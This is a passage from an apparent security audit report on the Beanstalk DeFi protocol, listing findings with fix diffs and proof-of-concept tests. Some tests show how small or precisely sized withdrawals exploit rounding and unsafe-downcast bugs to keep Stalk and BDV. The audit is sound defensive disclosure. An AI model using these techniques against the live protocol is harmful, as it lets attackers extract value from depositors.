The case has also been considered that, given the state changes will already have been applied, and assuming the migration transaction isn't top/bottom of block, it might be desirable to fork/filter up to the block before BIP-38 execution and check whether any migrations occurred before/after the migration transaction that need to be considered manually. After further inspection of the block in which the BIP-38 upgrade took place, it appears this is not necessary as no events were emitted.

An additional discrepancy in the unmigrated Bean BDV value was identified by the Beanstalk Farms team. After Silo V3, the implementation of `Sun::rewardToSilo` [increments the BDV](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L201-L204) by the amount of Bean issued to the Silo, but all previously earned Beans are not considered. Therefore, the value returned by `SiloExit::totalEarnedBeans` at the time of Silo V3 deployment should be added to the total.

**Impact:** The calculated unmigrated BDVs are incorrect, as shown below. The current implementation returns values that are smaller than they should be, meaning the total deposited BDV will fail to consider some deposits and be lower than intended.

Output of the current implementation:
```
unmigrated:  {
  '0x1BEA0050E63e05FBb5D8BA2f10cf5800B6224449': BigNumber { value: "3209210313166" },
  '0x1BEA3CcD22F4EBd3d37d731BA31Eeca95713716D': BigNumber { value: "6680992571569" },
  '0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab': BigNumber { value: "304630107407" },
  '0xc9C32cd16Bf7eFB85Ff14e0c8603cc90F6F2eE49': BigNumber { value: "26212521946" }
}
```

Corrected output:
```
unmigrated:  {
  '0x1BEA0050E63e05FBb5D8BA2f10cf5800B6224449': BigNumber { value: "3736196158417" },
  '0x1BEA3CcD22F4EBd3d37d731BA31Eeca95713716D': BigNumber { value: "7119564766493" },
  '0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab': BigNumber { value: "689428296238" },
  '0xc9C32cd16Bf7eFB85Ff14e0c8603cc90F6F2eE49': BigNumber { value: "26512602424" }
}
```

**Recommended Mitigation:** Apply the following diff:
```diff
// L645
- const END_BLOCK = 18480579;
+ const END_BLOCK = BLOCK_NUMBER;

// L811-812
- //get every transaction that emitted the RemoveDeposit event after block 17251905
+ //get every transaction that emitted the RemoveDeposit event after block 17671557
- let events = await queryEvents("RemoveDeposit(address,address,uint32,uint256)", removeDepositInterface, 17251905); //update this block to latest block when running actual script, in theory someone could have migrated meanwhile
+ let events = await queryEvents("RemoveDeposit(address,address,uint32,uint256)", removeDepositInterface, 17671557);
```
Retrieve the amount of Beans previously issued to the Silo:
```bash
cast call 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5 "totalEarnedBeans()" --rpc-url ${FORKING_RPC} --block "17671557"
```

\clearpage
## Low Risk


### Missing validation in `LibWhitelist::verifyTokenInLibWhitelistedTokens`

**Description:** Prior to the introduction of [`LibWhitelistedToken.sol`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibWhitelistedTokens.sol), Beanstalk did not have a way of iterating through its whitelisted tokens. To mitigate against an upgrade where a new asset is whitelisted, but `LibWhitelistedToken.sol` is not updated, [`LibWhitelist::verifyTokenInLibWhitelistedTokens`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibWhitelist.sol#L196-L217) verifies that the token is both in the correct array(s) and not in invalid arrays.

While `LibWhitelistedTokens::getWhitelistedWellLpTokens` is supposed to return a subset of whitelisted LP tokens, this is not guaranteed. In this case, if the token is either Bean or an Unripe Token, the first `else` block within `LibWhitelist::verifyTokenInLibWhitelistedTokens` should also check that the token is not in the whitelisted Well LP token array.

**Recommended Mitigation:**
```diff
} else {
    checkTokenNotInArray(token, LibWhitelistedTokens.getWhitelistedLpTokens());
+   checkTokenNotInArray(token, LibWhitelistedTokens.getWhitelistedWellLpTokens());
}
```


### Potentially unsafe cast from negative `int96` values

**Description:** Where calculations are performed on `int96` values, for example when manipulating stems in [`LibSilo::stalkReward`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L634-L638), [`LibTokenSilo::grownStalkForDeposit`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L422), and [`LibTokenSilo::calculateGrownStalkAndStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L452), Beanstalk uses the `LibSafeMathSigned96` library. Based on the invariant that the stem for a new deposit should never exceed the stem tip for a given token, casting these values to `uint256` is fine since the difference between the two stem values should never be negative. However, in the event of a bug that violates this invariant, it could be possible to have a negative `int96` value cast to a very large `uint256` value, potentially resulting in a huge amount of stalk being minted.

This issue is already sufficiently [mitigated](https://github.com/BeanstalkFarms/Beanstalk/blob/08ca0d7d495c94f2a4366fb7f99da561b74cc1c0/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L419-L422) in `LibTokenSilo::grownStalkForDeposit` and it appears the instance in `LibTokenSilo::calculateGrownStalkAndStem` can never reach this state. Additional logic should similarly be added to `LibSilo::stalkReward` to ensure that the result of subtraction is positive and thus the cast to `uint256` is safe.

**Impact:** While it appears not currently exploitable, a bug in the calculation of the stem for a given deposit or stem tip for a given token in `LibSilo::stalkReward` could result in the erroneous minting of a large amount of stalk.

**Proof of Concept:** The following forge test demonstrates this issue:
```solidity
contract TestStemsUnsafeCasting is Test {
    using LibSafeMathSigned96 for int96;

    function stalkReward(int96 startStem, int96 endStem, uint128 bdv)
        internal
        view
        returns (uint256)
    {
        int96 reward = endStem.sub(startStem).mul(int96(bdv));
        console.logInt(reward);
        console.logUint(uint128(reward));

        return uint128(reward);
    }

    function test_stalk_reward() external {
        uint256 reward = stalkReward(1200, 1000, 1337);
        console.logUint(reward);
    }
}
```

**Recommended Mitigation:** Add additional logic to safely perform the cast from `int96` or otherwise handle the case where the result of stem subtraction could be negative.


### Both reserves should be checked in `LibWell::getWellPriceFromTwaReserves`

**Description:**
```solidity
function getWellPriceFromTwaReserves(address well) internal view returns (uint256 price) {
    AppStorage storage s = LibAppStorage.diamondStorage();
    // s.twaReserve[well] should be set prior to this function being called.
    // 'price' is in terms of reserve0:reserve1.
    if (s.twaReserves[well].reserve0 == 0) {
        price = 0;
    } else {
        price = s.twaReserves[well].reserve0.mul(1e18).div(s.twaReserves[well].reserve1);
    }
}
```

Currently, `LibWell::getWellPriceFromTwaReserves` sets the price to zero if the time-weighted average reserves of the zeroth reserve (for Wells, Bean) is zero. Given the implementation of `LibWell::setTwaReservesForWell`, and that a Pump failure will return an empty reserves array, it does not appear possible to encounter the case where one reserve can be zero without the other except for perhaps an exploit or migration scenario. Therefore, whilst unlikely, it is best to but best to ensure both reserves are non-zero to avoid a potential division by zero `reserve1` when calculating the price as a revert here would result in DoS of `SeasonFacet::gm`.

```solidity
function setTwaReservesForWell(address well, uint256[] memory twaReserves) internal {
    AppStorage storage s = LibAppStorage.diamondStorage();
    // if the length of twaReserves is 0, then return 0.
    // the length of twaReserves should never be 1, but
    // is added for safety.
    if (twaReserves.length < 1) {
        delete s.twaReserves[well].reserve0;
        delete s.twaReserves[well].reserve1;
    } else {
        // safeCast not needed as the reserves are uint128 in the wells.
        s.twaReserves[well].reserve0 = uint128(twaReserves[0]);
        s.twaReserves[well].reserve1 = uint128(twaReserves[1]);
    }
}
```

Additionally, to correctly implement the check identified by the comment in `LibWell::setTwaReservesForWell`, the time-weighted average reserves in storage should be reset if the array length is less-than or equal-to 1.

**Recommended Mitigation:**
```diff
// LibWell::getWellPriceFromTwaReserves`
- if (s.twaReserves[well].reserve0 == 0) {
+ if (s.twaReserves[well].reserve0 == 0 || s.twaReserves[well].reserve1 == 0) {
        price = 0;
} else {

// LibWell::setTwaReservesForWell
- if (twaReserves.length < 1) {
+ if (twaReserves.length <= 1) {
    delete s.twaReserves[well].reserve0;
    delete s.twaReserves[well].reserve1;
} else {
```


### Potential DoS of `SeasonFacet::gm` due to division by zero in `LibGauge::updateGaugePoints`

There currently exists an edge case in [`LibGauge::updateGaugePoints`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L84) where it is possible to unintentionally DoS `SeasonFacet::gm` due to a potential division by zero. If there is only one newly whitelisted LP token in the Beanstalk protocol which therefore has no deposited BDV, execution will revert, thus preventing Beanstalk from advancing to the next Season. While it is unlikely that Beanstalk will encounter this issue so long as the existing whitelisted LP tokens remain, there is a small possibility that this could be an issue in the event of some future liquidity migration and so it should be handled accordingly.

```diff
...
// if there is only one pool, there is no need to update the gauge points.
if (whitelistedLpTokens.length == 1) {
    // Assumes that only Wells use USD price oracles.
    if (LibWell.isWell(whitelistedLpTokens[0]) && s.usdTokenPrice[whitelistedLpTokens[0]] == 0) {
        return (maxLpGpPerBdv, lpGpData, totalGaugePoints, type(uint256).max);
    }
    uint256 gaugePoints = s.ss[whitelistedLpTokens[0]].gaugePoints;
+   if (s.siloBalances[whitelistedLpTokens[0]].depositedBdv != 0) {
        lpGpData[0].gpPerBdv = gaugePoints.mul(BDV_PRECISION).div(
            s.siloBalances[whitelistedLpTokens[0]].depositedBdv
        );
+   }
    return (
        lpGpData[0].gpPerBdv,
        lpGpData,
        gaugePoints,
        s.siloBalances[whitelistedLpTokens[0]].depositedBdv
    );
}
...
```


### Small unripe token withdrawals don't decrease BDV and Stalk

**Description:** For any whitelisted token where `bdvCalc(amountDeposited) < amountDeposited`, a user can deposit that token and then withdraw in small amounts to avoid decreasing BDV and Stalk. This is achieved by exploiting a rounding down to zero precision loss in [`LibTokenSilo::removeDepositFromAccount`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L248):

```solidity
// @audit small unripe bean withdrawals don't decrease BDV and Stalk
// due to rounding down to zero precision loss. Every token where
// `bdvCalc(amountDeposited) < amountDeposited` is vulnerable
uint256 removedBDV = amount.mul(crateBDV).div(crateAmount);
```

**Impact:** An attacker can withdraw deposited assets without decreasing BDV and Stalk. While the cost to perform this attack is likely more than the value an attacker would stand to gain, the potential impact should definitely be explored more closely especially considering the introduction of the Unripe Chop Convert in BIP-39 as this could have other unintended consequences in relation to this bug (given that the inflated BDV of an Unripe Token will persist once deposit is converted to its ripe counterpart, potentially allowing value to be extracted that way depending on how this BDV is used/manipulated elsewhere).

The other primary consideration for this bug is that it breaks the mechanism that Stalk is supposed to be lost when withdrawing deposited assets and keeps the `totalDepositedBdv` artificially high, violating the invariant that the `totalDepositedBdv` value for a token should be the sum of the BDV value of all the individual deposits.

**Proof of Concept:** Add this PoC to `SiloToken.test.js` under the section `describe("1 deposit, some", async function () {`:

```javascript
it('audit small unripe bean withdrawals dont decrease BDV and Stalks', async function () {
    let initialUnripeBeanDeposited    = to6('10');
    let initialUnripeBeanDepositedBdv = '2355646';
    let initialTotalStalk = pruneToStalk(initialUnripeBeanDeposited).add(toStalk('0.5'));

    // verify initial state
    expect(await this.silo.getTotalDeposited(UNRIPE_BEAN)).to.eq(initialUnripeBeanDeposited);
    expect(await this.silo.getTotalDepositedBdv(UNRIPE_BEAN)).to.eq(initialUnripeBeanDepositedBdv);
    expect(await this.silo.totalStalk()).to.eq(initialTotalStalk);

    // snapshot EVM state as we want to restore it after testing the normal
    // case works as expected
    let snapshotId = await network.provider.send('evm_snapshot');

    // normal case: withdrawing total UNRIPE_BEAN correctly decreases BDV & removes stalks
    const stem = await this.silo.seasonToStem(UNRIPE_BEAN, '10');
    await this.silo.connect(user).withdrawDeposit(UNRIPE_BEAN, stem, initialUnripeBeanDeposited, EXTERNAL);

    // verify UNRIPE_BEAN totalDeposited == 0
    expect(await this.silo.getTotalDeposited(UNRIPE_BEAN)).to.eq('0');
    // verify UNRIPE_BEAN totalDepositedBDV == 0
    expect(await this.silo.getTotalDepositedBdv(UNRIPE_BEAN)).to.eq('0');
    // verify silo.totalStalk() == 0
    expect(await this.silo.totalStalk()).to.eq('0');

    // restore EVM state to snapshot prior to testing normal case
    await network.provider.send("evm_revert", [snapshotId]);

    // re-verify initial state
    expect(await this.silo.getTotalDeposited(UNRIPE_BEAN)).to.eq(initialUnripeBeanDeposited);
    expect(await this.silo.getTotalDepositedBdv(UNRIPE_BEAN)).to.eq(initialUnripeBeanDepositedBdv);
    expect(await this.silo.totalStalk()).to.eq(initialTotalStalk);

    // attacker case: withdrawing small amounts of UNRIPE_BEAN doesn't decrease
    // BDV and doesn't remove stalks. This lets an attacker withdraw their deposits
    // without losing Stalks & breaks the invariant that the totalDepositedBDV should
    // equal the sum of the BDV of all individual deposits
    let smallWithdrawAmount = '4';
    await this.silo.connect(user).withdrawDeposit(UNRIPE_BEAN, stem, smallWithdrawAmount, EXTERNAL);

    // verify UNRIPE_BEAN totalDeposited has been correctly decreased
    expect(await this.silo.getTotalDeposited(UNRIPE_BEAN)).to.eq(initialUnripeBeanDeposited.sub(smallWithdrawAmount));
    // verify UNRIPE_BEAN totalDepositedBDV remains unchanged!
    expect(await this.silo.getTotalDepositedBdv(UNRIPE_BEAN)).to.eq(initialUnripeBeanDepositedBdv);
    // verify silo.totalStalk() remains unchanged!
    expect(await this.silo.totalStalk()).to.eq(initialTotalStalk);
});
```
Run with: `npx hardhat test --grep "audit small unripe bean withdrawals dont decrease BDV and Stalks"`.

Additional Mainnet fork tests have been written to demonstrate the presence of this bug in the current and post-BIP-39 deployments of Beanstalk (see Appendix B).

**Recommended Mitigation:** `LibTokenSilo::removeDepositFromAccount` should revert if `removedBDV == 0`. A similar check already exists in [`LibTokenSilo::depositWithBDV`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L141) but is missing in `removeDepositFromAccount()` when calculating `removedBDV` for partial withdrawals.

The breaking of protocol invariants could lead to other serious issues that have not yet been identified but may well exist if core properties do not hold. We would urge the team to consider fixing this bug as soon as possible, prior to or as part of the BIP-39 upgrade.


### Stalk rewards don't get burned for large partial withdrawals due to unsafe downcast

**Description:** When calling `SiloFacet::withdrawDeposit`, it is possible that Stalk rewards are not burned for large partial withdrawals as `LibSilo::stalkReward` will return 0 due to an [unsafe downcast](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L631-L636) of `removedBDV` from `uint128 -> int96`.

**Impact:** Stalk rewards don't get burned for large partial withdrawals.

**Proof of Concept:** Add to `SiloToken.test.js` under the section `describe("deposit", function () {`:
```javascript
    describe("audit withdrawing deposited asset for large BDV value", function () {
      // values found via fuzz testing
      let beanDeposit       = "79228162514264337593543950337";
      let problemRemovedBdv = "79228162514264337593543950336";

      beforeEach(async function () {
        await this.season.teleportSunrise(10);
        this.season.deployStemsUpgrade();

        await this.siloToken.connect(user).approve(this.silo.address, beanDeposit);
        await this.siloToken.mint(userAddress, beanDeposit);
        await this.silo.connect(user).deposit(this.siloToken.address, beanDeposit, EXTERNAL);
      });

      it("audit stalk rewards not burned when withdrawing deposited asset for large BDV value", async function () {
        let initialTotalStalk = beanDeposit + "0000";

        // verify initial state
        expect(await this.silo.getTotalDeposited(this.siloToken.address)).to.eq(beanDeposit);
        // siloToken has 1:1 BDV calc
        expect(await this.silo.getTotalDepositedBdv(this.siloToken.address)).to.eq(beanDeposit);
        expect(await this.silo.totalStalk()).to.eq(initialTotalStalk);

        // fast forward to build up some stalk rewards
        await this.season.teleportSunrise(20);

        // snapshot EVM state as we want to restore it after testing the normal
        // case works as expected
        let snapshotId = await network.provider.send("evm_snapshot");

        // normal case: withdraw the entire deposited amount
        const stem = await this.silo.seasonToStem(this.siloToken.address, "10");
        await this.silo.connect(user).withdrawDeposit(this.siloToken.address, stem, beanDeposit, EXTERNAL);

        // verify token.totalDeposited == 0
        expect(await this.silo.getTotalDeposited(this.siloToken.address)).to.eq("0");
        // verify token.totalDepositedBDV == 0
        expect(await this.silo.getTotalDepositedBdv(this.siloToken.address)).to.eq("0");
        // verify totalStalk == 0; both the initial stalk & stalk rewards were burned
        expect(await this.silo.totalStalk()).to.eq("0");

        // restore EVM state to snapshot prior to testing normal case
        await network.provider.send("evm_revert", [snapshotId]);

        // re-verify initial state
        expect(await this.silo.getTotalDeposited(this.siloToken.address)).to.eq(beanDeposit);
        // siloToken has 1:1 BDV calc
        expect(await this.silo.getTotalDepositedBdv(this.siloToken.address)).to.eq(beanDeposit);
        expect(await this.silo.totalStalk()).to.eq(initialTotalStalk);

        // problem case: partial withdraw a precise amount causing
        // by LibTokenSilo::removeDepositFromAccount() to calculate & return
        // `removedBDV` to a known exploitable value. This causes LibSilo::stalkReward()
        // to return 0 due to an unsafe downcast of `removedBDV` from uint128 -> int96
        // meaning stalk rewards are not burned when the withdrawal occurs
        await this.silo.connect(user).withdrawDeposit(this.siloToken.address, stem, problemRemovedBdv, EXTERNAL);

        // verify token.totalDeposited has been correcly decremented
        expect(await this.silo.getTotalDeposited(this.siloToken.address)).to.eq("1");
        // verify token.totalDepositedBDV == 1 as siloToken has 1:1 BDV calc
        expect(await this.silo.getTotalDepositedBdv(this.siloToken.address)).to.eq("1");

        // verify totalStalk == 10000 which fails and instead 10010 is returned.
        //
        // A return of 10010 is incorrect as there is only 1 BEAN left deposited
        // so totalStalk should equal 10000 as the 10 stalk rewards should have
        // been burned with the withdrawal, but this didn't happen due to the
        // unsafe downcast in LibSilo::stalkReward() causing stalkReward() to
        // return 0
        expect(await this.silo.totalStalk()).to.eq("10000");
      });
    });
```

**Recommended Mitigation:** The withdrawal should revert if the result of the downcast overflows such that no Stalk is burned. This could be achieved by performing a safe downcast and/or validating that a non-zero Stalk amount is burned when withdrawing a non-zero BDV. [`LibTokenSilo::toInt96`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L478-L481) is used in that contract for validating inputs and casting.

\clearpage
## Informational


### Incorrect storage slot annotation in `Storage::SiloSettings`

While it appears that the order struct members in storage have not changed, the storage slot annotation of [`Storage::SiloSettings`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/AppStorage.sol#L393-L404) in `AppStorage.sol` is incorrect and should be updated as follows:

```diff
struct SiloSettings {
    bytes4 selector; //  4
-   uint32 stalkEarnedPerSeason; //   4  (16)
+   uint32 stalkEarnedPerSeason; //   4  (8)
-   uint32 stalkIssuedPerBdv; //      4  (8)
+   uint32 stalkIssuedPerBdv; //      4  (12)
-   uint32 milestoneSeason; //        4  (12)
+   uint32 milestoneSeason; //        4  (16)
    int96 milestoneStem; //           12 (28)
    bytes1 encodeType; //  1  (29)
    // 3 bytes are left here.
    uint128 gaugePoints; //   -------- 16
    bytes4 gpSelector; //                     4   (20)
    uint96 optimalPercentDepositedBdv; //  12  (32)
}
```



### `LibLockedUnderlying` regression might not be representative of the expected behaviour

The percentage of locked liquidity, used in determining the L2SR in `LibEvaluate`, is obtained through the implementation of an on-chain look-up table based on an off-chain linear regression. The assumption considered acceptable for both Unripe Bean and Unripe LP is that 46,659 Unripe Tokens are chopped at each step. This number is calculated by dividing the number of Unripe Tokens by the number of Unripe Token Holders, resulting in an average of 46,659 Unripe Tokens held per Farmer with a non-zero balance. 2000 is used as a slight overestimation of the number of holders for both Unripe Bean and Unripe LP. An overestimation is acceptable because it results in a more conservative L2SR.

However, this average might not accurately represent what is expected in each Chop. For example, consider a scenario where 9 users each have 100,000 Unripe Tokens, and one user has 5.1 million Unripe Tokens.

$$\frac{Number\ of \ Unripe\; Tokens}{Number\ of \ Unripe\ Token \ Holders}= \frac{9 \times 100.000 + 5.100.000}{10} =$$

$$\frac{900.000 + 5.100.000}{10} = \frac{6.000.000}{10}=600.000$$

In this case, the regression would consider that `600,000` Unripe Tokens are Chopped in each step, which can actually be done by just one single user. Therefore, here it would be better to use the mode or median values rather than the mean.


### Outdated Seed Gauge System documentation in PR and inline comments

There are multiple instances in both the PR and inline comments where documentation of the Seed Gauge System is outdated. For example:
- `LibWhitelist::updateGaugeForToken` does not allow the gauge points to be changed. This is contrary to the comment in [`WhitelistFacet::updateGaugeForToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L172).
- The behavior of [`LibGauge::getBeanToMaxLpGpPerBdvRatioScaled`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L316-L329) is incorrectly documented as the reverse of its actual behavior, which is `f(0) = MIN_BEAN_MAX_LPGP_RATIO` and `f(100e18) = MAX_BEAN_MAX_LPGP_RATIO`.
- Gauge Points are not normalized to `100e18`, as stated in the PR.
- The [`MIN_BEAN_MAX_LP_GP_PER_BDV_RATIO`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L32) constant is actually `50e18`, not `25e18` as stated in the PR.
- `gpPerBdv` and `beanToMaxLpGpPerBdvRatio` both have 18 decimal precision, but there are [multiple](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L153) [comments](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L210) which [incorrectly](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L215) state that these variables have 6 decimal precision.


### Duplicated code between `LibChop` and `LibUnripe`

Duplicate versions of [`LibUnripe::_getPenalizedUnderlying`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibUnripe.sol#L143-L151) and [`LibUnripe::isUnripe`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibUnripe.sol#L217-L223) have been added to [`LibChop`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibChop.sol#L38-L64). This is not necessary as the logic that executes is identical, so these duplicate versions can be removed in favor of code reuse.


### Outdated reference to urBEAN3CRV Convert

There are multiple instances in `LibConvert::getMaxAmountIn` and `LibConvert::getAmountOut` that reference conversion to urBEAN3CRV and BEAN:3CRV. Since the underlying liquidity has now been migrated to the BEAN:ETH Well, it is no longer possible to convert Unripe Bean or Unripe LP to BEAN:3CRV. Therefore, the following diff should be applied:

```diff
function getMaxAmountIn(address tokenIn, address tokenOut)
    internal
    view
    returns (uint256)
{
    /// BEAN:3CRV LP -> BEAN
    if (tokenIn == C.CURVE_BEAN_METAPOOL && tokenOut == C.BEAN)
        return LibCurveConvert.lpToPeg(C.CURVE_BEAN_METAPOOL);

    /// BEAN -> BEAN:3CRV LP
    if (tokenIn == C.BEAN && tokenOut == C.CURVE_BEAN_METAPOOL)
        return LibCurveConvert.beansToPeg(C.CURVE_BEAN_METAPOOL);

    // Lambda -> Lambda
    if (tokenIn == tokenOut)
        return type(uint256).max;

    // Bean -> Well LP Token
    if (tokenIn == C.BEAN && tokenOut.isWell())
        return LibWellConvert.beansToPeg(tokenOut);

    // Well LP Token -> Bean
    if (tokenIn.isWell() && tokenOut == C.BEAN)
        return LibWellConvert.lpToPeg(tokenIn);

-   // urBEAN3CRV Convert
+   // urBEAN:ETH Convert
    if (tokenIn == C.UNRIPE_LP){
-       // urBEAN:3CRV -> urBEAN
+       // urBEAN:ETH -> urBEAN
        if(tokenOut == C.UNRIPE_BEAN)
            return LibUnripeConvert.lpToPeg();
-       // UrBEAN:3CRV -> BEAN:3CRV
+       // UrBEAN:ETH -> BEAN:ETH
-       if(tokenOut == C.CURVE_BEAN_METAPOOL)
+       if(tokenOut == C.BEAN_ETH_WELL)
        return type(uint256).max;
    }

    // urBEAN Convert
    if (tokenIn == C.UNRIPE_BEAN){
-       // urBEAN -> urBEAN:3CRV LP
+       // urBEAN -> urBEAN:ETH LP
        if(tokenOut == C.UNRIPE_LP)
            return LibUnripeConvert.beansToPeg();
        // UrBEAN -> BEAN
        if(tokenOut == C.BEAN)
            return type(uint256).max;
    }

    revert("Convert: Tokens not supported");
}

function getAmountOut(address tokenIn, address tokenOut, uint256 amountIn)
    internal
    view
    returns (uint256)
{
    /// BEAN:3CRV LP -> BEAN
    if (tokenIn == C.CURVE_BEAN_METAPOOL && tokenOut == C.BEAN)
        return LibCurveConvert.getBeanAmountOut(C.CURVE_BEAN_METAPOOL, amountIn);

    /// BEAN -> BEAN:3CRV LP
    if (tokenIn == C.BEAN && tokenOut == C.CURVE_BEAN_METAPOOL)
        return LibCurveConvert.getLPAmountOut(C.CURVE_BEAN_METAPOOL, amountIn);

-   /// urBEAN:3CRV LP -> urBEAN
+   /// urBEAN:ETH LP -> urBEAN
    if (tokenIn == C.UNRIPE_LP && tokenOut == C.UNRIPE_BEAN)
        return LibUnripeConvert.getBeanAmountOut(amountIn);

-   /// urBEAN -> urBEAN:3CRV LP
+   /// urBEAN -> urBEAN:ETH LP
    if (tokenIn == C.UNRIPE_BEAN && tokenOut == C.UNRIPE_LP)
        return LibUnripeConvert.getLPAmountOut(amountIn);

    // Lambda -> Lambda
    if (tokenIn == tokenOut)
        return amountIn;

    // Bean -> Well LP Token
    if (tokenIn == C.BEAN && tokenOut.isWell())
        return LibWellConvert.getLPAmountOut(tokenOut, amountIn);

    // Well LP Token -> Bean
    if (tokenIn.isWell() && tokenOut == C.BEAN)
        return LibWellConvert.getBeanAmountOut(tokenIn, amountIn);

    // UrBEAN -> Bean
    if (tokenIn == C.UNRIPE_BEAN && tokenOut == C.BEAN)
        return LibChopConvert.getConvertedUnderlyingOut(tokenIn, amountIn);

-   // UrBEAN:3CRV -> BEAN:3CRV
+   // UrBEAN:ETH -> BEAN:ETH
-   if (tokenIn == C.UNRIPE_LP && tokenOut == C.CURVE_BEAN_METAPOOL)
+   if (tokenIn == C.UNRIPE_LP && tokenOut == C.BEAN_ETH_WELL)
        return LibChopConvert.getConvertedUnderlyingOut(tokenIn, amountIn);

    revert("Convert: Tokens not supported");
}
```


### Miscellaneous NatSpec and inline comment errors

The following NatSpec errors were identified:
- [`UnripeFacet::balanceOfPenalizedUnderlying`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/barn/UnripeFacet.sol#L208-L214) NatSpec is incorrectly copied from [`UnripeFacet::balanceOfUnderlying`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/barn/UnripeFacet.sol#L194-L201) and should be modified for this particular function.
- The NatSpec of [`LibWell::getTwaReservesForWell`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Well/LibWell.sol#L189) is incorrect. It states that this function returns the `USD / TKN` price stored in `{AppStorage.usdTokenPrice}`; however, this is actually the `TKN / USD` price and should be updated accordingly.
- A [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L90) explaining the implementation of`Weather::updateTemperature` incorrectly references `uint32(-change)` where it should instead be `uint256(-change)`.
- A [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibCases.sol#L55) in `LibCases` explaining the behavior of the constants incorrectly states `Bean2maxLpGpPerBdv set to 10% of current value` when it should be 50% of the current value.
- A [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L77) in `InitBipNewSilo` has been changed to state the `stemStartSeason` is stored as a `uint32` when it is actually `uint16`.
- The NatSpec for the [`int8[32] cases`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/AppStorage.sol#L456) member of `AppStorage` is outdated and along with the [member itself](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/AppStorage.sol#L507) should be marked as deprecated in favor of `bytes32[144] casesV2`.
- There is a slight error in the case of [`TwaReserves`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/AppStorage.sol#L499) in the NatSpec of `AppStorage` which should instead be `twaReserves`.
- [`deprecated_beanEthPrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/AppStorage.sol#L564) does not currently exist in the NatSpec of `AppStorage`. It should be added along with an explanation of why this member is deprecated.


### Time-weighted average reserves should be read from the Beanstalk Pump in `LibWell` using a `try/catch` block

